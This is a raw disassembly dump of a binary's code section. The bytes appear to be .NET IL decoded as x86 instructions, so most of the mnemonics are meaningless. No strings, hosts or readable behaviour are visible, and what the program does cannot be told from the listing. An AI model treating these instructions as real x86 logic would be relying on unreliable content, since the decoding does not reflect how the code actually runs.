  4036d3:	00 5f 9e             	add    %bl,-0x62(%edi)
  4036d6:	00 0a                	add    %cl,(%edx)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 00                	add    %al,(%eax)
  4036dc:	02 00                	add    (%eax),%al
  4036de:	38 00                	cmp    %al,(%eax)
  4036e0:	72 aa                	jb     0x40368c
  4036e2:	00 0a                	add    %cl,(%edx)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	00 00                	add    %al,(%eax)
  4036ea:	02 00                	add    (%eax),%al
  4036ec:	c0 c2 00             	rol    $0x0,%dl
  4036ef:	03 13                	add    (%ebx),%edx
  4036f1:	00 00                	add    %al,(%eax)
  4036f3:	01 02                	add    %eax,(%edx)
  4036f5:	00 02                	add    %al,(%edx)
  4036f7:	00 c3                	add    %al,%bl
  4036f9:	c5 00                	lds    (%eax),%eax
  4036fb:	0a 00                	or     (%eax),%al
  4036fd:	00 00                	add    %al,(%eax)
  4036ff:	00 1b                	add    %bl,(%ebx)
  403701:	30 03                	xor    %al,(%ebx)
  403703:	00 87 00 00 00 1a    	add    %al,0x1a000000(%edi)
  403709:	00 00                	add    %al,(%eax)
  40370b:	11 72 20             	adc    %esi,0x20(%edx)
  40370e:	02 00                	add    (%eax),%al
  403710:	70 72                	jo     0x403784
  403712:	59                   	pop    %ecx
  403713:	0a 00                	or     (%eax),%al
  403715:	70 02                	jo     0x403719
  403717:	28 68 00             	sub    %ch,0x0(%eax)
  40371a:	00 0a                	add    %cl,(%edx)
  40371c:	73 ac                	jae    0x4036ca
  40371e:	00 00                	add    %al,(%eax)
  403720:	0a 25 17 6f 69 00    	or     0x696f17,%ah
  403726:	00 0a                	add    %cl,(%edx)
  403728:	25 17 6f ad 00       	and    $0xad6f17,%eax
  40372d:	00 0a                	add    %cl,(%edx)
  40372f:	25 16 6f 1f 00       	and    $0x1f6f16,%eax
  403734:	00 0a                	add    %cl,(%edx)
  403736:	25 17 6f 1e 00       	and    $0x1e6f17,%eax
  40373b:	00 0a                	add    %cl,(%edx)
  40373d:	28 20                	sub    %ah,(%eax)
  40373f:	00 00                	add    %al,(%eax)
  403741:	0a 0a                	or     (%edx),%cl
  403743:	06                   	push   %es
  403744:	6f                   	outsl  %ds:(%esi),(%dx)
  403745:	6b 00 00             	imul   $0x0,(%eax),%eax
  403748:	0a 6f 6c             	or     0x6c(%edi),%ch
  40374b:	00 00                	add    %al,(%eax)
  40374d:	0a 0b                	or     (%ebx),%cl
  40374f:	06                   	push   %es
  403750:	6f                   	outsl  %ds:(%esi),(%dx)
  403751:	ae                   	scas   %es:(%edi),%al
  403752:	00 00                	add    %al,(%eax)
  403754:	0a 6f 6c             	or     0x6c(%edi),%ch
  403757:	00 00                	add    %al,(%eax)
  403759:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40375c:	6f                   	outsl  %ds:(%esi),(%dx)
  40375d:	6d                   	insl   (%dx),%es:(%edi)
  40375e:	00 00                	add    %al,(%eax)
  403760:	0a 08                	or     (%eax),%cl
  403762:	28 a8 00 00 0a 2d    	sub    %ch,0x2d0a0000(%eax)
  403768:	04 08                	add    $0x8,%al
  40376a:	0d de 24 07 0d       	or     $0xd0724de,%eax
  40376f:	de 20                	fisubs (%eax)
  403771:	06                   	push   %es
  403772:	2c 06                	sub    $0x6,%al
  403774:	06                   	push   %es
  403775:	6f                   	outsl  %ds:(%esi),(%dx)
  403776:	70 00                	jo     0x403778
  403778:	00 0a                	add    %cl,(%edx)
  40377a:	dc 13                	fcoml  (%ebx)
  40377c:	04 72                	add    $0x72,%al
  40377e:	61                   	popa
  40377f:	0a 00                	or     (%eax),%al
  403781:	70 11                	jo     0x403794
  403783:	04 6f                	add    $0x6f,%al
  403785:	6e                   	outsb  %ds:(%esi),(%dx)
  403786:	00 00                	add    %al,(%eax)
  403788:	0a 28                	or     (%eax),%ch
  40378a:	68 00 00 0a 0d       	push   $0xd0a0000
  40378f:	de 00                	fiadds (%eax)
  403791:	09 2a                	or     %ebp,(%edx)
  403793:	00 01                	add    %al,(%ecx)
  403795:	1c 00                	sbb    $0x0,%al
  403797:	00 02                	add    %al,(%edx)
  403799:	00 37                	add    %dh,(%edi)
  40379b:	00 2e                	add    %ch,(%esi)
  40379d:	65 00 0a             	add    %cl,%gs:(%edx)
	...
  4037a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4037a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4037aa:	00 16                	add    %dl,(%esi)
  4037ac:	1a 00                	sbb    (%eax),%al
  4037ae:	00 01                	add    %al,(%ecx)
  4037b0:	1b 30                	sbb    (%eax),%esi
  4037b2:	05 00 83 00 00       	add    $0x8300,%eax
  4037b7:	00 1b                	add    %bl,(%ebx)
  4037b9:	00 00                	add    %al,(%eax)
  4037bb:	11 28                	adc    %ebp,(%eax)
  4037bd:	af                   	scas   %es:(%edi),%eax
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	b0 00                	mov    $0x0,%al
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	b1 00                	mov    $0x0,%cl
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	0a 16                	or     (%esi),%dl
  4037cd:	0b 2b                	or     (%ebx),%ebp
  4037cf:	5f                   	pop    %edi
  4037d0:	06                   	push   %es
  4037d1:	07                   	pop    %es
  4037d2:	9a 0c 08 6f b2 00 00 	lcall  $0x0,$0xb26f080c
  4037d9:	0a 18                	or     (%eax),%bl
  4037db:	33 4e 08             	xor    0x8(%esi),%ecx
  4037de:	6f                   	outsl  %ds:(%esi),(%dx)
  4037df:	7f 00                	jg     0x4037e1
  4037e1:	00 0a                	add    %cl,(%edx)
  4037e3:	17                   	pop    %ss
  4037e4:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  4037e8:	01 25 16 1f 2e 9d    	add    %esp,0x9d2e1f16
  4037ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ef:	b3 00                	mov    $0x0,%bl
  4037f1:	00 0a                	add    %cl,(%edx)
  4037f3:	0d 09 8e 69 1a       	or     $0x1a698e09,%eax
  4037f8:	33 31                	xor    (%ecx),%esi
  4037fa:	1b 8d 57 00 00 01    	sbb    0x1000057(%ebp),%ecx
  403800:	25 16 09 16 9a       	and    $0x9a160916,%eax
  403805:	a2 25 17 72 2c       	mov    %al,0x2c721725
  40380a:	13 00                	adc    (%eax),%eax
  40380c:	70 a2                	jo     0x4037b0
  40380e:	25 18 09 17 9a       	and    $0x9a170918,%eax
  403813:	a2 25 19 72 2c       	mov    %al,0x2c721925
  403818:	13 00                	adc    (%eax),%eax
  40381a:	70 a2                	jo     0x4037be
  40381c:	25 1a 09 18 9a       	and    $0x9a18091a,%eax
  403821:	a2 28 8f 00 00       	mov    %al,0x8f28
  403826:	0a 13                	or     (%ebx),%dl
  403828:	04 de                	add    $0xde,%al
  40382a:	11 07                	adc    %eax,(%edi)
  40382c:	17                   	pop    %ss
  40382d:	58                   	pop    %eax
  40382e:	0b 07                	or     (%edi),%eax
  403830:	06                   	push   %es
  403831:	8e 69 32             	mov    0x32(%ecx),%gs
  403834:	9b de 03             	fiadds (%ebx)
  403837:	26 de 00             	fiadds %es:(%eax)
  40383a:	14 2a                	adc    $0x2a,%al
  40383c:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  40383f:	00 01                	add    %al,(%ecx)
  403841:	10 00                	adc    %al,(%eax)
  403843:	00 00                	add    %al,(%eax)
  403845:	00 00                	add    %al,(%eax)
  403847:	00 7b 7b             	add    %bh,0x7b(%ebx)
  40384a:	00 03                	add    %al,(%ebx)
  40384c:	13 00                	adc    (%eax),%eax
  40384e:	00 01                	add    %al,(%ecx)
  403850:	1b 30                	sbb    (%eax),%esi
  403852:	03 00                	add    (%eax),%eax
  403854:	36 00 00             	add    %al,%ss:(%eax)
  403857:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40385a:	00 11                	add    %dl,(%ecx)
  40385c:	73 b4                	jae    0x403812
  40385e:	00 00                	add    %al,(%eax)
  403860:	0a 0a                	or     (%edx),%cl
  403862:	06                   	push   %es
  403863:	02 20                	add    (%eax),%ah
  403865:	f4                   	hlt
  403866:	01 00                	add    %eax,(%eax)
  403868:	00 6f b5             	add    %ch,-0x4b(%edi)
  40386b:	00 00                	add    %al,(%eax)
  40386d:	0a 0b                	or     (%ebx),%cl
  40386f:	07                   	pop    %es
  403870:	2c 0b                	sub    $0xb,%al
  403872:	07                   	pop    %es
  403873:	6f                   	outsl  %ds:(%esi),(%dx)
  403874:	b6 00                	mov    $0x0,%dh
  403876:	00 0a                	add    %cl,(%edx)
  403878:	16                   	push   %ss
  403879:	fe 01                	incb   (%ecx)
  40387b:	2b 01                	sub    (%ecx),%eax
  40387d:	16                   	push   %ss
  40387e:	0c de                	or     $0xde,%al
  403880:	0f 06                	clts
  403882:	2c 06                	sub    $0x6,%al
  403884:	06                   	push   %es
  403885:	6f                   	outsl  %ds:(%esi),(%dx)
  403886:	70 00                	jo     0x403888
  403888:	00 0a                	add    %cl,(%edx)
  40388a:	dc 26                	fsubl  (%esi)
  40388c:	de 00                	fiadds (%eax)
  40388e:	16                   	push   %ss
  40388f:	2a 08                	sub    (%eax),%cl
  403891:	2a 00                	sub    (%eax),%al
  403893:	00 01                	add    %al,(%ecx)
  403895:	1c 00                	sbb    $0x0,%al
  403897:	00 02                	add    %al,(%edx)
  403899:	00 06                	add    %al,(%esi)
  40389b:	00 1f                	add    %bl,(%edi)
  40389d:	25 00 0a 00 00       	and    $0xa00,%eax
  4038a2:	00 00                	add    %al,(%eax)
  4038a4:	00 00                	add    %al,(%eax)
  4038a6:	00 00                	add    %al,(%eax)
  4038a8:	2f                   	das
  4038a9:	2f                   	das
  4038aa:	00 03                	add    %al,(%ebx)
  4038ac:	13 00                	adc    (%eax),%eax
  4038ae:	00 01                	add    %al,(%ecx)
  4038b0:	1b 30                	sbb    (%eax),%esi
  4038b2:	03 00                	add    (%eax),%eax
  4038b4:	33 00                	xor    (%eax),%eax
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  4038bd:	b7 00                	mov    $0x0,%bh
  4038bf:	00 0a                	add    %cl,(%edx)
  4038c1:	0a 06                	or     (%esi),%al
  4038c3:	02 03                	add    (%ebx),%al
  4038c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c6:	b8 00 00 0a 04       	mov    $0x40a0000,%eax
  4038cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4038cc:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4038d1:	08 06                	or     %al,(%esi)
  4038d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4038d4:	ba 00 00 0a 2b       	mov    $0x2b0a0000,%edx
  4038d9:	01 16                	add    %edx,(%esi)
  4038db:	0b de                	or     %esi,%ebx
  4038dd:	0f 06                	clts
  4038df:	2c 06                	sub    $0x6,%al
  4038e1:	06                   	push   %es
  4038e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e3:	70 00                	jo     0x4038e5
  4038e5:	00 0a                	add    %cl,(%edx)
  4038e7:	dc 26                	fsubl  (%esi)
  4038e9:	16                   	push   %ss
  4038ea:	0b de                	or     %esi,%ebx
  4038ec:	00 07                	add    %al,(%edi)
  4038ee:	2a 00                	sub    (%eax),%al
  4038f0:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4038f3:	00 02                	add    %al,(%edx)
  4038f5:	00 06                	add    %al,(%esi)
  4038f7:	00 1c 22             	add    %bl,(%edx,%eiz,1)
  4038fa:	00 0a                	add    %cl,(%edx)
	...
  403904:	2c 2c                	sub    $0x2c,%al
  403906:	00 05 13 00 00 01    	add    %al,0x1000013
  40390c:	1b 30                	sbb    (%eax),%esi
  40390e:	02 00                	add    (%eax),%al
  403910:	46                   	inc    %esi
  403911:	00 00                	add    %al,(%eax)
  403913:	00 1e                	add    %bl,(%esi)
  403915:	00 00                	add    %al,(%eax)
  403917:	11 02                	adc    %eax,(%edx)
  403919:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	2d 04 16 0b de       	sub    $0xde0b1604,%eax
  403923:	38 02                	cmp    %al,(%edx)
  403925:	28 bb 00 00 0a 0a    	sub    %bh,0xa0a0000(%ebx)
  40392b:	28 3b                	sub    %bh,(%ebx)
  40392d:	00 00                	add    %al,(%eax)
  40392f:	0a 06                	or     (%esi),%al
  403931:	28 bc 00 00 0a 0c 12 	sub    %bh,0x120c0a00(%eax,%eax,1)
  403938:	02 28                	add    (%eax),%ch
  40393a:	bd 00 00 0a 23       	mov    $0x230a0000,%ebp
  40393f:	00 00                	add    %al,(%eax)
  403941:	00 00                	add    %al,(%eax)
  403943:	00 00                	add    %al,(%eax)
  403945:	38 40 36             	cmp    %al,0x36(%eax)
  403948:	0a 02                	or     (%edx),%al
  40394a:	28 30                	sub    %dh,(%eax)
  40394c:	00 00                	add    %al,(%eax)
  40394e:	0a 16                	or     (%esi),%dl
  403950:	0b de                	or     %esi,%ebx
  403952:	09 17                	or     %edx,(%edi)
  403954:	0b de                	or     %esi,%ebx
  403956:	05 26 16 0b de       	add    $0xde0b1626,%eax
  40395b:	00 07                	add    %al,(%edi)
  40395d:	2a 00                	sub    (%eax),%al
  40395f:	00 01                	add    %al,(%ecx)
  403961:	10 00                	adc    %al,(%eax)
  403963:	00 00                	add    %al,(%eax)
  403965:	00 00                	add    %al,(%eax)
  403967:	00 3f                	add    %bh,(%edi)
  403969:	3f                   	aas
  40396a:	00 05 13 00 00 01    	add    %al,0x1000013
  403970:	13 30                	adc    (%eax),%esi
  403972:	02 00                	add    (%eax),%al
  403974:	3f                   	aas
  403975:	00 00                	add    %al,(%eax)
  403977:	00 1f                	add    %bl,(%edi)
  403979:	00 00                	add    %al,(%eax)
  40397b:	11 12                	adc    %edx,(%edx)
  40397d:	00 28                	add    %ch,(%eax)
  40397f:	94                   	xchg   %eax,%esp
  403980:	00 00                	add    %al,(%eax)
  403982:	0a 7d 3e             	or     0x3e(%ebp),%bh
  403985:	00 00                	add    %al,(%eax)
  403987:	04 12                	add    $0x12,%al
  403989:	00 02                	add    %al,(%edx)
  40398b:	7d 3f                	jge    0x4039cc
  40398d:	00 00                	add    %al,(%eax)
  40398f:	04 12                	add    $0x12,%al
  403991:	00 03                	add    %al,(%ebx)
  403993:	7d 40                	jge    0x4039d5
  403995:	00 00                	add    %al,(%eax)
  403997:	04 12                	add    $0x12,%al
  403999:	00 15 7d 3d 00 00    	add    %dl,0x3d7d
  40399f:	04 12                	add    $0x12,%al
  4039a1:	00 7c 3e 00          	add    %bh,0x0(%esi,%edi,1)
  4039a5:	00 04 12             	add    %al,(%edx,%edx,1)
  4039a8:	00 28                	add    %ch,(%eax)
  4039aa:	04 00                	add    $0x0,%al
  4039ac:	00 2b                	add    %ch,(%ebx)
  4039ae:	12 00                	adc    (%eax),%al
  4039b0:	7c 3e                	jl     0x4039f0
  4039b2:	00 00                	add    %al,(%eax)
  4039b4:	04 28                	add    $0x28,%al
  4039b6:	96                   	xchg   %eax,%esi
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 2a                	or     (%edx),%ch
  4039bb:	2e 7e 13             	jle,pn 0x4039d1
  4039be:	00 00                	add    %al,(%eax)
  4039c0:	04 6f                	add    $0x6f,%al
  4039c2:	be 00 00 0a 2a       	mov    $0x2a0a0000,%esi
  4039c7:	00 13                	add    %dl,(%ebx)
  4039c9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4039cc:	94                   	xchg   %eax,%esp
  4039cd:	00 00                	add    %al,(%eax)
  4039cf:	00 00                	add    %al,(%eax)
  4039d1:	00 00                	add    %al,(%eax)
  4039d3:	00 73 3f             	add    %dh,0x3f(%ebx)
  4039d6:	00 00                	add    %al,(%eax)
  4039d8:	0a 80 0f 00 00 04    	or     0x400000f(%eax),%al
  4039de:	1f                   	pop    %ds
  4039df:	09 8d 57 00 00 01    	or     %ecx,0x1000057(%ebp)
  4039e5:	25 16 72 30 13       	and    $0x13307216,%eax
  4039ea:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039ed:	25 17 72 36 13       	and    $0x13367217,%eax
  4039f2:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039f5:	25 18 72 44 13       	and    $0x13447218,%eax
  4039fa:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039fd:	25 19 72 50 13       	and    $0x13507219,%eax
  403a02:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a05:	25 1a 72 5e 13       	and    $0x135e721a,%eax
  403a0a:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a0d:	25 1b 72 72 13       	and    $0x1372721b,%eax
  403a12:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a15:	25 1c 72 86 13       	and    $0x1386721c,%eax
  403a1a:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a1d:	25 1d 72 94 13       	and    $0x1394721d,%eax
  403a22:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a25:	25 1e 72 9e 13       	and    $0x139e721e,%eax
  403a2a:	00 70 a2             	add    %dh,-0x5e(%eax)
  403a2d:	80 10 00             	adcb   $0x0,(%eax)
  403a30:	00 04 73             	add    %al,(%ebx,%esi,2)
  403a33:	bf 00 00 0a 80       	mov    $0x800a0000,%edi
  403a38:	13 00                	adc    (%eax),%eax
  403a3a:	00 04 72             	add    %al,(%edx,%esi,2)
  403a3d:	a8 13                	test   $0x13,%al
  403a3f:	00 70 80             	add    %dh,-0x80(%eax)
  403a42:	14 00                	adc    $0x0,%al
  403a44:	00 04 72             	add    %al,(%edx,%esi,2)
  403a47:	ec                   	in     (%dx),%al
  403a48:	13 00                	adc    (%eax),%eax
  403a4a:	70 80                	jo     0x4039cc
  403a4c:	15 00 00 04 1f       	adc    $0x1f040000,%eax
  403a51:	7a 8d                	jp     0x4039e0
  403a53:	4b                   	dec    %ebx
  403a54:	00 00                	add    %al,(%eax)
  403a56:	01 25 d0 24 00 00    	add    %esp,0x24d0
  403a5c:	04 28                	add    $0x28,%al
  403a5e:	22 00                	and    (%eax),%al
  403a60:	00 0a                	add    %cl,(%edx)
  403a62:	80 16 00             	adcb   $0x0,(%esi)
  403a65:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403a68:	c6                   	(bad)
  403a69:	7e 43                	jle    0x403aae
  403a6b:	00 00                	add    %al,(%eax)
  403a6d:	04 25                	add    $0x25,%al
  403a6f:	2d 17 26 7e 42       	sub    $0x427e2617,%eax
  403a74:	00 00                	add    %al,(%eax)
  403a76:	04 fe                	add    $0xfe,%al
  403a78:	06                   	push   %es
  403a79:	77 00                	ja     0x403a7b
  403a7b:	00 06                	add    %al,(%esi)
  403a7d:	73 35                	jae    0x403ab4
  403a7f:	00 00                	add    %al,(%eax)
  403a81:	0a 25 80 43 00 00    	or     0x4380,%ah
  403a87:	04 73                	add    $0x73,%al
  403a89:	36 00 00             	add    %al,%ss:(%eax)
  403a8c:	0a 25 17 6f 37 00    	or     0x376f17,%ah
  403a92:	00 0a                	add    %cl,(%edx)
  403a94:	6f                   	outsl  %ds:(%esi),(%dx)
  403a95:	38 00                	cmp    %al,(%eax)
  403a97:	00 0a                	add    %cl,(%edx)
  403a99:	2a 00                	sub    (%eax),%al
  403a9b:	00 13                	add    %dl,(%ebx)
  403a9d:	30 05 00 53 00 00    	xor    %al,0x5300
  403aa3:	00 20                	add    %ah,(%eax)
  403aa5:	00 00                	add    %al,(%eax)
  403aa7:	11 7e 19             	adc    %edi,0x19(%esi)
  403aaa:	00 00                	add    %al,(%eax)
  403aac:	04 1e                	add    $0x1e,%al
  403aae:	1f                   	pop    %ds
  403aaf:	0d 6f 39 00 00       	or     $0x396f,%eax
  403ab4:	0a 0a                	or     (%edx),%cl
  403ab6:	06                   	push   %es
  403ab7:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  403abb:	01 0b                	add    %ecx,(%ebx)
  403abd:	16                   	push   %ss
  403abe:	0c 2b                	or     $0x2b,%al
  403ac0:	25 07 08 72 06       	and    $0x6720807,%eax
  403ac5:	14 00                	adc    $0x0,%al
  403ac7:	70 7e                	jo     0x403b47
  403ac9:	19 00                	sbb    %eax,(%eax)
  403acb:	00 04 72             	add    %al,(%edx,%esi,2)
  403ace:	06                   	push   %es
  403acf:	14 00                	adc    $0x0,%al
  403ad1:	70 28                	jo     0x403afb
  403ad3:	41                   	inc    %ecx
  403ad4:	00 00                	add    %al,(%eax)
  403ad6:	0a 6f c0             	or     -0x40(%edi),%ch
  403ad9:	00 00                	add    %al,(%eax)
  403adb:	0a 28                	or     (%eax),%ch
  403add:	c1 00 00             	roll   $0x0,(%eax)
  403ae0:	0a 9d 08 17 58 0c    	or     0xc581708(%ebp),%bl
  403ae6:	08 06                	or     %al,(%esi)
  403ae8:	32 d7                	xor    %bh,%dl
  403aea:	07                   	pop    %es
  403aeb:	73 c2                	jae    0x403aaf
  403aed:	00 00                	add    %al,(%eax)
  403aef:	0a 72 50             	or     0x50(%edx),%dh
  403af2:	14 00                	adc    $0x0,%al
  403af4:	70 28                	jo     0x403b1e
  403af6:	68 00 00 0a 2a       	push   $0x2a0a0000
  403afb:	00 1b                	add    %bl,(%ebx)
  403afd:	30 02                	xor    %al,(%edx)
  403aff:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403b02:	00 00                	add    %al,(%eax)
  403b04:	15 00 00 11 28       	adc    $0x28110000,%eax
  403b09:	31 00                	xor    %eax,(%eax)
  403b0b:	00 0a                	add    %cl,(%edx)
  403b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  403b0e:	32 00                	xor    (%eax),%al
  403b10:	00 0a                	add    %cl,(%edx)
  403b12:	6f                   	outsl  %ds:(%esi),(%dx)
  403b13:	33 00                	xor    (%eax),%eax
  403b15:	00 0a                	add    %cl,(%edx)
  403b17:	0a 02                	or     (%edx),%al
  403b19:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403b1c:	00 0a                	add    %cl,(%edx)
  403b1e:	2d 07 06 02 28       	sub    $0x28020607,%eax
  403b23:	c3                   	ret
  403b24:	00 00                	add    %al,(%eax)
  403b26:	0a 02                	or     (%edx),%al
  403b28:	1d 28 c4 00 00       	sbb    $0xc428,%eax
  403b2d:	0a de                	or     %dh,%bl
  403b2f:	03 26                	add    (%esi),%esp
  403b31:	de 00                	fiadds (%eax)
  403b33:	2a 01                	sub    (%ecx),%al
  403b35:	10 00                	adc    %al,(%eax)
  403b37:	00 00                	add    %al,(%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 28                	add    %ch,(%eax)
  403b3d:	28 00                	sub    %al,(%eax)
  403b3f:	03 13                	add    (%ebx),%edx
  403b41:	00 00                	add    %al,(%eax)
  403b43:	01 1b                	add    %ebx,(%ebx)
  403b45:	30 03                	xor    %al,(%ebx)
  403b47:	00 32                	add    %dh,(%edx)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 22                	add    %ah,(%edx)
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	11 7e 26             	adc    %edi,0x26(%esi)
  403b52:	00 00                	add    %al,(%eax)
  403b54:	0a 72 43             	or     0x43(%edx),%dh
  403b57:	05 00 70 17 6f       	add    $0x6f177000,%eax
  403b5c:	27                   	daa
  403b5d:	00 00                	add    %al,(%eax)
  403b5f:	0a 0a                	or     (%edx),%cl
  403b61:	06                   	push   %es
  403b62:	2c 0c                	sub    $0xc,%al
  403b64:	06                   	push   %es
  403b65:	7e 18                	jle    0x403b7f
  403b67:	00 00                	add    %al,(%eax)
  403b69:	04 02                	add    $0x2,%al
  403b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6c:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6d:	00 00                	add    %al,(%eax)
  403b6f:	0a de                	or     %dh,%bl
  403b71:	0a 06                	or     (%esi),%al
  403b73:	2c 06                	sub    $0x6,%al
  403b75:	06                   	push   %es
  403b76:	6f                   	outsl  %ds:(%esi),(%dx)
  403b77:	70 00                	jo     0x403b79
  403b79:	00 0a                	add    %cl,(%edx)
  403b7b:	dc de                	(bad)
  403b7d:	03 26                	add    (%esi),%esp
  403b7f:	de 00                	fiadds (%eax)
  403b81:	2a 00                	sub    (%eax),%al
  403b83:	00 01                	add    %al,(%ecx)
  403b85:	1c 00                	sbb    $0x0,%al
  403b87:	00 02                	add    %al,(%edx)
  403b89:	00 11                	add    %dl,(%ecx)
  403b8b:	00 11                	add    %dl,(%ecx)
  403b8d:	22 00                	and    (%eax),%al
  403b8f:	0a 00                	or     (%eax),%al
  403b91:	00 00                	add    %al,(%eax)
  403b93:	00 00                	add    %al,(%eax)
  403b95:	00 00                	add    %al,(%eax)
  403b97:	00 2e                	add    %ch,(%esi)
  403b99:	2e 00 03             	add    %al,%cs:(%ebx)
  403b9c:	13 00                	adc    (%eax),%eax
  403b9e:	00 01                	add    %al,(%ecx)
  403ba0:	1b 30                	sbb    (%eax),%esi
  403ba2:	04 00                	add    $0x0,%al
  403ba4:	68 00 00 00 23       	push   $0x23000000
  403ba9:	00 00                	add    %al,(%eax)
  403bab:	11 72 5a             	adc    %esi,0x5a(%edx)
  403bae:	14 00                	adc    $0x0,%al
  403bb0:	70 0a                	jo     0x403bbc
  403bb2:	1b 8d 57 00 00 01    	sbb    0x1000057(%ebp),%ecx
  403bb8:	25 16 72 84 14       	and    $0x14847216,%eax
  403bbd:	00 70 a2             	add    %dh,-0x5e(%eax)
  403bc0:	25 17 06 a2 25       	and    $0x25a20617,%eax
  403bc5:	18 72 d0             	sbb    %dh,-0x30(%edx)
  403bc8:	14 00                	adc    $0x0,%al
  403bca:	70 a2                	jo     0x403b6e
  403bcc:	25 19 02 a2 25       	and    $0x25a20219,%eax
  403bd1:	1a 72 e0             	sbb    -0x20(%edx),%dh
  403bd4:	14 00                	adc    $0x0,%al
  403bd6:	70 a2                	jo     0x403b7a
  403bd8:	28 8f 00 00 0a 0b    	sub    %cl,0xb0a0000(%edi)
  403bde:	72 ea                	jb     0x403bca
  403be0:	14 00                	adc    $0x0,%al
  403be2:	70 07                	jo     0x403beb
  403be4:	73 ac                	jae    0x403b92
  403be6:	00 00                	add    %al,(%eax)
  403be8:	0a 25 17 6f 1e 00    	or     0x1e6f17,%ah
  403bee:	00 0a                	add    %cl,(%edx)
  403bf0:	25 16 6f 1f 00       	and    $0x1f6f16,%eax
  403bf5:	00 0a                	add    %cl,(%edx)
  403bf7:	25 17 6f 71 00       	and    $0x716f17,%eax
  403bfc:	00 0a                	add    %cl,(%edx)
  403bfe:	28 20                	sub    %ah,(%eax)
  403c00:	00 00                	add    %al,(%eax)
  403c02:	0a 25 2d 03 26 2b    	or     0x2b26032d,%ah
  403c08:	05 28 6d 00 00       	add    $0x6d28,%eax
  403c0d:	0a de                	or     %dh,%bl
  403c0f:	03 26                	add    (%esi),%esp
  403c11:	de 00                	fiadds (%eax)
  403c13:	2a 01                	sub    (%ecx),%al
  403c15:	10 00                	adc    %al,(%eax)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	00 00                	add    %al,(%eax)
  403c1b:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  403c1f:	03 13                	add    (%ebx),%edx
  403c21:	00 00                	add    %al,(%eax)
  403c23:	01 1b                	add    %ebx,(%ebx)
  403c25:	30 03                	xor    %al,(%ebx)
  403c27:	00 72 00             	add    %dh,0x0(%edx)
  403c2a:	00 00                	add    %al,(%eax)
  403c2c:	24 00                	and    $0x0,%al
  403c2e:	00 11                	add    %dl,(%ecx)
  403c30:	28 31                	sub    %dh,(%ecx)
  403c32:	00 00                	add    %al,(%eax)
  403c34:	0a 6f 32             	or     0x32(%edi),%ch
  403c37:	00 00                	add    %al,(%eax)
  403c39:	0a 6f 33             	or     0x33(%edi),%ch
  403c3c:	00 00                	add    %al,(%eax)
  403c3e:	0a 0a                	or     (%edx),%cl
  403c40:	7e 17                	jle    0x403c59
  403c42:	00 00                	add    %al,(%eax)
  403c44:	04 0b                	add    $0xb,%al
  403c46:	16                   	push   %ss
  403c47:	0c 2b                	or     $0x2b,%al
  403c49:	4c                   	dec    %esp
  403c4a:	07                   	pop    %es
  403c4b:	08 9a 72 04 15 00    	or     %bl,0x150472(%edx)
  403c51:	70 28                	jo     0x403c7b
  403c53:	c5 00                	lds    (%eax),%eax
  403c55:	00 0a                	add    %cl,(%edx)
  403c57:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  403c5c:	2e 09 11             	or     %edx,%cs:(%ecx)
  403c5f:	04 9a                	add    $0x9a,%al
  403c61:	13 05 11 05 02 1b    	adc    0x1b020511,%eax
  403c67:	6f                   	outsl  %ds:(%esi),(%dx)
  403c68:	c6 00 00             	movb   $0x0,(%eax)
  403c6b:	0a 2d 17 11 05 06    	or     0x6051117,%ch
  403c71:	1b 6f c6             	sbb    -0x3a(%edi),%ebp
  403c74:	00 00                	add    %al,(%eax)
  403c76:	0a 2d 0c 11 05 28    	or     0x2805110c,%ch
  403c7c:	30 00                	xor    %al,(%eax)
  403c7e:	00 0a                	add    %cl,(%edx)
  403c80:	de 03                	fiadds (%ebx)
  403c82:	26 de 00             	fiadds %es:(%eax)
  403c85:	11 04 17             	adc    %eax,(%edi,%edx,1)
  403c88:	58                   	pop    %eax
  403c89:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403c8c:	04 09                	add    $0x9,%al
  403c8e:	8e 69 32             	mov    0x32(%ecx),%gs
  403c91:	cb                   	lret
  403c92:	08 17                	or     %dl,(%edi)
